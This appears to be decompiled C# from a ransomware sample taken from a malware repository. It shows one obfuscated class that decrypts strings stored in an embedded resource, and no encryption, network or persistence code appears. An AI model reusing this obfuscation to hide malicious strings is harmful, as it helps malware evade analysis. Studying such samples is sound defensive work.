// Decompiled with JetBrains decompiler
// Type: .
// Assembly: smss, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: E062C21C-108A-4088-B8AD-F222EA4C3418
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-29f84241ce2d6a79cfefca98655fcd4fd54dd724bded5f239ceefec315a648b5.exe

using \u0004;
using \u0007;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u0001
{
  internal class \u0004
  {
    private static readonly string \u0001 = "1";
    private static readonly string \u0002 = "191";
    private static readonly byte[] \u0003 = (byte[]) null;
    private static readonly Hashtable \u0004 = (Hashtable) null;
    private static readonly bool \u0005 = false;
    private static readonly int \u0006 = 0;

    [\u0007.\u0004]
    [\u0006]
    public static string \u0001([In] int obj0)
    {
      obj0 -= \u0001.\u0004.\u0006;
      if (\u0001.\u0004.\u0005)
      {
        string str = (string) \u0089\u0003.\u007E\u008F\u0004((object) \u0001.\u0004.\u0004, (object) obj0);
        if (str != null)
          return str;
      }
      int num1 = obj0;
      byte[] numArray1 = \u0001.\u0004.\u0003;
      int index1 = num1;
      int num2 = index1 + 1;
      int num3 = (int) numArray1[index1];
      int num4;
      if ((num3 & 128) == 0)
      {
        num4 = num3;
        if (num4 == 0)
          return string.Empty;
      }
      else if ((num3 & 64) == 0)
      {
        num4 = ((num3 & 63) << 8) + (int) \u0001.\u0004.\u0003[num2++];
      }
      else
      {
        int num5 = (num3 & 31) << 24;
        byte[] numArray2 = \u0001.\u0004.\u0003;
        int index2 = num2;
        int num6 = index2 + 1;
        int num7 = (int) numArray2[index2] << 16;
        int num8 = num5 + num7;
        byte[] numArray3 = \u0001.\u0004.\u0003;
        int index3 = num6;
        int num9 = index3 + 1;
        int num10 = (int) numArray3[index3] << 8;
        int num11 = num8 + num10;
        byte[] numArray4 = \u0001.\u0004.\u0003;
        int index4 = num9;
        num2 = index4 + 1;
        int num12 = (int) numArray4[index4];
        num4 = num11 + num12;
      }
      try
      {
        byte[] numArray5 = \u0099.\u0089\u0002(\u007F\u0002.\u007E\u001A\u0003((object) \u0004\u0002.\u0097\u0002(), \u0001.\u0004.\u0003, num2, num4));
        string str = \u009E.\u0092\u0002(\u007F\u0002.\u007E\u001A\u0003((object) \u0004\u0002.\u0097\u0002(), numArray5, 0, numArray5.Length));
        if (\u0001.\u0004.\u0005)
        {
          try
          {
            \u008A\u0003.\u007E\u0090\u0004((object) \u0001.\u0004.\u0004, (object) obj0, (object) str);
          }
          catch
          {
          }
        }
        return str;
      }
      catch
      {
        return (string) null;
      }
    }

    static \u0004()
    {
      if (\u008B\u0003.\u0091\u0004(\u0001.\u0004.\u0001, "1"))
      {
        \u0001.\u0004.\u0005 = true;
        \u0001.\u0004.\u0004 = new Hashtable();
      }
      \u0001.\u0004.\u0006 = \u0002\u0003.\u0005\u0004(\u0001.\u0004.\u0002);
      Assembly assembly = \u001F\u0003.\u0084\u0004();
      Stream stream = \u008C\u0003.\u007E\u0092\u0004((object) assembly, "{9c40744f-4f88-46fa-b5c1-f4cc87308008}");
      try
      {
        int length = \u008E\u0003.\u0094\u0004(\u008D\u0003.\u007E\u0093\u0004((object) stream));
        byte[] numArray = new byte[length];
        int num = \u0010\u0003.\u007E\u0016\u0004((object) stream, numArray, 0, length);
        \u0001.\u0004.\u0003 = \u0005.\u0001(numArray);
        \u0018.\u007E\u008F((object) stream);
      }
      finally
      {
        if (stream != null)
          \u0018.\u007E\u008C((object) stream);
      }
    }
  }
}
